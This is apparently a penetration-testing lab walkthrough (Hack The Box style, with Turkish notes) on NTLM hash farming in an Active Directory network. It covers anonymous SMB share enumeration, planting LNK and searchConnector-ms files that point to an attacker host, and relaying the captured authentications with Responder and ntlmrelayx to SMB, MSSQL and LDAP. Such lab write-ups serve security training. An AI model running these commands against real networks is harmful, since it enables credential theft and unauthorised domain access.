# Farming Hashes

## Enumeration

```sh
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.0/24 -u 'anonymous' -p '' --shares
```

```output title="Output" hl_lines="9 11 25"
SMB         172.16.117.3    445    DC01             [*] Enumerated shares
SMB         172.16.117.3    445    DC01             Share           Permissions     Remark
SMB         172.16.117.3    445    DC01             -----           -----------     ------
SMB         172.16.117.3    445    DC01             ADMIN$                          Remote Admin
SMB         172.16.117.3    445    DC01             C$                              Default share
SMB         172.16.117.3    445    DC01             CertEnroll                      Active Directory Certificate Services share
SMB         172.16.117.3    445    DC01             IPC$            READ            Remote IPC
SMB         172.16.117.3    445    DC01             NETLOGON                        Logon server share
SMB         172.16.117.3    445    DC01             smb             READ,WRITE
SMB         172.16.117.3    445    DC01             SYSVOL                          Logon server share
SMB         172.16.117.3    445    DC01             Testing         READ,WRITE
SMB         172.16.117.50   445    WS01             [*] Enumerated shares
SMB         172.16.117.50   445    WS01             Share           Permissions     Remark
SMB         172.16.117.50   445    WS01             -----           -----------     ------
SMB         172.16.117.50   445    WS01             ADMIN$                          Remote Admin
SMB         172.16.117.50   445    WS01             C$                              Default share
SMB         172.16.117.50   445    WS01             Finance
SMB         172.16.117.50   445    WS01             IPC$            READ            Remote IPC
SMB         172.16.117.60   445    SQL01            [*] Enumerated shares
SMB         172.16.117.60   445    SQL01            Share           Permissions     Remark
SMB         172.16.117.60   445    SQL01            -----           -----------     ------
SMB         172.16.117.60   445    SQL01            ADMIN$                          Remote Admin
SMB         172.16.117.60   445    SQL01            C$                              Default share
SMB         172.16.117.60   445    SQL01            IPC$            READ            Remote IPC
SMB         172.16.117.60   445    SQL01            Test            READ,WRITE
```

## File Type Attacks

!!! abstract

    1. Saldırgan adresini ([UAC path](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths)) işaret eden bir kısayol dosyası yazılabilir bir paylaşıma yüklenir.
    2. Kullanıcı paylaşıma erişir.
    3. Sistem, dosya ikonunu göstermeye çalışır.
    4. Kullanıcı ile saldırgan arasında bir SMB kimlik doğrulama süreci başlar.

### Uploading the Shortcut

#### [NTLM Theft](https://github.com/Greenwolf/ntlm_theft)

```sh
htb-student@ubuntu:~$ cd ntlm_theft
htb-student@ubuntu:~/ntlm_theft$ python3 ntlm_theft.py -g all -s 172.16.117.30 -f @important
htb-student@ubuntu:~/ntlm_theft$ cd @important
htb-student@ubuntu:~/ntlm_theft/@important$ smbclient -U 'anonymous%' //172.16.117.3/smb
smb: \> put @important.lnk
smb: \> exit
```

#### CrackMapExec

```sh
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.3 -u 'anonymous' -p '' -M slinky -o SERVER=172.16.117.30 NAME=@important
```

```output title="Output" hl_lines="2 4"
SLINKY      172.16.117.3    445    DC01             [+] Found writable share: smb
SLINKY      172.16.117.3    445    DC01             [+] Created LNK file on the smb share
SLINKY      172.16.117.3    445    DC01             [+] Found writable share: Testing
SLINKY      172.16.117.3    445    DC01             [+] Created LNK file on the Testing share
```

### Disabling Responder Servers

```sh
htb-student@ubuntu:~$ sed -e '9,24s/= On/= Off/g' -i Responder.conf
htb-student@ubuntu:~$ head Responder.conf -n 24
```

```ini title="Output"
[Responder Core]

; Poisoners to start
MDNS  = On
LLMNR = On
NBTNS = On

; Servers to start
SQL      = Off
SMB      = Off
RDP      = Off
Kerberos = Off
FTP      = Off
POP      = Off
SMTP     = Off
IMAP     = Off
HTTP     = Off
HTTPS    = Off
DNS      = Off
LDAP     = Off
DCERPC   = Off
WINRM    = Off
SNMP     = Off
MQTT     = Off
```

### Responder (Serverless)

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

### Attacking Protocols

```sh
htb-student@ubuntu:~$ sudo rm -f relays.txt
htb-student@ubuntu:~$ echo "all://172.16.117.50" | sudo tee -a relays.txt
htb-student@ubuntu:~$ echo "all://172.16.117.60" | sudo tee -a relays.txt
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf relays.txt -smb2support -socks
```

```output title="Output" hl_lines="3 6"
[*] SMBD-Thread-27: Connection from INLANEFREIGHT/CMATOS@172.16.117.50 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/CMATOS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/CMATOS@172.16.117.60(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-28: Connection from INLANEFREIGHT/CMATOS@172.16.117.50 controlled, attacking target mssql://172.16.117.60
[*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/CMATOS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/CMATOS@172.16.117.60(1433) to active SOCKS connection. Enjoy
```

## HTTP WebDAV Attacks

!!! abstract

    1. Saldırgan adresini (URL) işaret eden bir [Search Connector Description](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) dosyası yazılabilir bir paylaşıma yüklenir.
    2. Kullanıcı paylaşıma erişir.
    3. Sistem, dosyada bulunan adrese erişmeye çalışır.
    4. [WebDAV](https://learn.microsoft.com/en-us/windows/win32/webdav/webdav-portal) servisinden sorumlu [WebClient](https://revertservice.com/10/webclient/) servisi başlar.
    5. Saldırgan adresini ([WebDAV connection string](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#abuse)) işaret eden bir kısayol dosyası yazılabilir bir paylaşıma yüklenir.
    6. Kullanıcı paylaşıma erişir.
    7. Sistem, dosya ikonunu göstermeye çalışır.
    8. Kullanıcı ile saldırgan arasında bir HTTP kimlik doğrulama süreci başlar.

### Starting the WebDAV Service

#### Manual Method

```sh
htb-student@ubuntu:~$ echo '<?xml version="1.0" encoding="utf-8"?><searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector"><description>Microsoft Outlook</description><isSearchOnlyItem>false</isSearchOnlyItem><includeInStartMenuScope>true</includeInStartMenuScope><iconReference>https://172.16.117.30/test/0001.ico</iconReference><templateInfo><folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType></templateInfo><simpleLocation><url>https://172.16.117.30/test</url></simpleLocation></searchConnectorDescription>' > @secret.searchConnector-ms
htb-student@ubuntu:~$ smbclient -U 'anonymous%' //172.16.117.3/smb
smb: \> put @secret.searchConnector-ms
smb: \> exit
```

#### Automated Method

```sh
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.3 -u 'anonymous' -p '' -M drop-sc -o URL=https://172.16.117.30/test SHARE=smb FILENAME=@secret
```

```output title="Output" hl_lines="4"
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\anonymous:
DROP-SC     172.16.117.3    445    DC01             [+] Found writable share: smb
DROP-SC     172.16.117.3    445    DC01             [+] [OPSEC] Created @secret.searchConnector-ms file on the smb share
```

### Checking the WebDAV Service

```sh
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.0/24 -u 'plaintext$' -p 'Password123!' -M webdav
```

```output title="Output" hl_lines="6"
SMB         172.16.117.3    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.117.50   445    WS01             [*] Windows 10.0 Build 17763 x64 (name:WS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.60   445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.117.3    445    DC01             [+] INLANEFREIGHT.LOCAL\plaintext$:Password123! (Pwn3d!)
SMB         172.16.117.50   445    WS01             [+] INLANEFREIGHT.LOCAL\plaintext$:Password123!
WEBDAV      172.16.117.50   445    WS01             WebClient Service enabled on: 172.16.117.50
SMB         172.16.117.60   445    SQL01            [+] INLANEFREIGHT.LOCAL\plaintext$:Password123!
```

### Shortcut Upload

```sh
htb-student@ubuntu:~$ crackmapexec smb 172.16.117.3 -u 'anonymous' -p '' -M slinky -o SERVER=gibberish@8008 NAME=@important
```

```output title="Output" hl_lines="2 4"
SLINKY      172.16.117.3    445    DC01             [+] Found writable share: smb
SLINKY      172.16.117.3    445    DC01             [+] Created LNK file on the smb share
SLINKY      172.16.117.3    445    DC01             [+] Found writable share: Testing
SLINKY      172.16.117.3    445    DC01             [+] Created LNK file on the Testing share
```

### Disabling Responder HTTP

```ini title="Responder.conf" linenums="17"
HTTP     = Off
```

### Starting Responder

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

### Dumping Domain Information

| OPTION | DESCRIPTION |
|---|---|
| --no-validate-privs | Daha önceden yetki yükseltme yapıldığı için kontrol devre dışı bırakıldı. |
| --no-smb-server | HTTP protokolüne odaklanıldı. Bu seçenek zorunlu değildir. |
| --http-port | Zehirlenen sorguyu yakalamak için ilgili port numarası belirtildi. |

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --no-validate-privs --no-smb-server --http-port 8008 --lootdir domain_dump
```

```output title="Output" hl_lines="1 5"
[*] HTTPD(8008): Connection from 172.16.117.50 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(8008): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/CMATOS SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```
